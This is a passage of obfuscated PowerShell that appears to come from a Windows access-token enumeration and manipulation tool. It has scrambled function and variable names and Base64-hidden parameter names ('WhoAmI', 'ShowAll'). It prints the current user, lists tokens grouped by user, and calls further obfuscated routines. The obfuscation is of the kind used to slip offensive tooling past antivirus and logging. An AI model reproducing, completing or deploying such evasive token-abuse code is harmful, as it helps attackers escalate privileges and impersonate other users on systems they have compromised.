        elseif ($PsCmdlet.ParameterSetName -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBoAG8AQQBtAEkA'))))
        {
            echo "$([Environment]::UserDomainName)\$([Environment]::UserName)"
        }
        else 
        {
            ${___/===\_/==\___/=} = _/=\/====\/=\/==\/
            if ($PsCmdlet.ParameterSetName -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAG8AdwBBAGwAbAA='))))
            {
                echo ${___/===\_/==\___/=}
            }
            else
            {
                echo (__/\_/\___/=\/=\_/ -___/===\_/==\___/= ${___/===\_/==\___/=}).TokenByUser.Values
            }
            __/====\_/===\/\/=
            _/=\/=\_/\_/=\___/ -___/=\/====\__/\_/ ${___/===\_/==\___/=}
        }
    }
    __/\/\/=\/==\/\/\/
}